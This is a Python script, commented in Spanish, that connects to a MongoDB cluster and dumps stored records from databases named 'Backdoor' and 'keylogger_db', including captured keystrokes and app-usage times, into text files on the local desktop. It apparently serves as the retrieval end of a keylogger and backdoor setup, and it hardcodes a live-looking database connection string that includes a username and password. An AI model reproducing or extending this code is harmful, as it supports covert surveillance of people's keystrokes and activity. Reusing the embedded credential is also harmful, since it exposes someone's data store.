import os
import json
from pymongo import MongoClient
from gridfs import GridFS
from bson import json_util

# === Configuración de MongoDB ===
MONGO_URI = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"

# Definir las bases de datos y colecciones a extraer
DATABASE_CONFIG = {
    "Backdoor": ["keylogger", "TiempoEnApps"],
    "keylogger_db": ["keystrokes"],
    "JarvisAI": ["prueba"]
    # Añade más bases de datos y sus colecciones según necesites
}

# === Configuración del sistema de archivos ===
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
JARVIS_DATA_PATH = os.path.join(DESKTOP_PATH, "jarvis_data")
DATA_BD_PATH = os.path.join(JARVIS_DATA_PATH, "databd")

# Crear carpetas principales
MAIN_FOLDERS = {"text": "texto", "audio": "audio", "image": "imagen"}
for folder in MAIN_FOLDERS.values():
    os.makedirs(os.path.join(DATA_BD_PATH, folder), exist_ok=True)

# === Función para guardar archivos ===
def save_file(data, file_name, folder):
    file_path = os.path.join(JARVIS_DATA_PATH, folder, file_name)
    with open(file_path, "wb") as file:
        file.write(data)
    print(f"Archivo guardado: {file_path}")

# === Conexión a MongoDB con mejor manejo de errores ===
try:
    client = MongoClient(MONGO_URI)
    # Verificar la conexión
    client.admin.command('ping')
    print("Conexión exitosa a MongoDB")
except Exception as e:
    print(f"Error de conexión a MongoDB: {str(e)}")
    exit(1)

# === Extracción de datos ===
def extract_and_save_data():
    print("Iniciando extracción de datos de MongoDB...")
    
    for database_name, collections in DATABASE_CONFIG.items():
        print(f"\nProcesando base de datos: {database_name}")
        db = client[database_name]
        
        for collection_name in collections:
            print(f"Procesando colección: {collection_name}")
            collection = db[collection_name]
            
            cursor = collection.find({})
            document_count = 0
            
            for document in cursor:
                try:
                    # Para colecciones de texto (keylogger y TiempoEnApps)
                    if collection_name in ["keylogger", "keystrokes", "TiempoEnApps"]:
                        # Crear nombre de archivo único
                        timestamp = document.get('timestamp', str(document.get('_id')))
                        file_name = f"{database_name}_{collection_name}_{timestamp}.txt"
                        file_path = os.path.join(DATA_BD_PATH, "texto", file_name)
                        
                        # Usar json_util para manejar tipos especiales de MongoDB
                        content = json_util.dumps(document, indent=2, ensure_ascii=False)
                        
                        # Guardar el archivo
                        with open(file_path, "w", encoding="utf-8") as text_file:
                            text_file.write(content)
                        document_count += 1
                        print(f"Guardado documento {document_count} en {file_name}")
                
                except Exception as e:
                    print(f"Error procesando documento en {collection_name}: {str(e)}")
                    continue
                
            print(f"Se procesaron {document_count} documentos en la colección {collection_name}")

    print("\nExtracción completa.")

# === Ejecutar ===
if __name__ == "__main__":
    extract_and_save_data()
